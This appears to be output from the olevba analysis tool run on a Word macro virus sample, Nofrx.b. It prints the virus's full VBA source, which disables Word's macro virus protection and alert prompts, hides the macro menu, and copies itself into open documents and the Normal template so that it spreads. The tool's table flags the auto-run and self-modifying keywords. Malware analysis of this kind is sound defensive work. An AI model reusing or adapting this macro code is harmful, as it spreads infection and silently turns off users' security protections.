olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nofrx.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nofrx.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Application.ShowVisualBasicEditor = False
CommandBars("Tools").Controls("Macro").Delete
With Options
.VirusProtection = False
.SaveNormalPrompt = False
.ConfirmConversions = False
End With
With Application
.ScreenUpdating = (7 - 7)
.EnableCancelKey = wdCancelDisabled
.DisplayAlerts = wdAlertsNone
.StatusBar = "Please Wait..."
End With
snim = ActiveDocument.Saved
Set alin = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set nlin = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set this = ThisDocument.VBProject.VBComponents(1).CodeModule
If alin.CountOfLines < this.CountOfLines Then
alin.AddFromString this.Lines(1, this.CountOfLines)
ActiveDocument.Save
End If
If nlin.CountOfLines < this.CountOfLines Then
nlin.AddFromString this.Lines(1, this.CountOfLines)
End If
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1), 1) <> "Private Sub Document_Open()" Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Private Sub Document_Open()"
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1), 1) <> "Private Sub Document_Close()" Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Private Sub Document_Close()"
End If
With Application.Assistant.NewBalloon
.BalloonType = msoBalloonTypeButtons
.Button = msoButtonSetOK
.Text = ("NoFrx from ImPU1s3 to " & Application.UserName)
.Animation = msoAnimationGreeting
.SetAvoidRectangle 7, 7, 7, 7
.Mode = msoModeModal
.Show
End With
'WM2000-WM97/NoFrx.b by ImPU1s3@EvilNet Inc.
'Greetinz to R3d Devi1, G3n3s1s and L33ch (members of EvilNet Inc.)
'Viruso.Pisanje zivi u Bosni ´99
ActiveDocument.Saved = snim
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

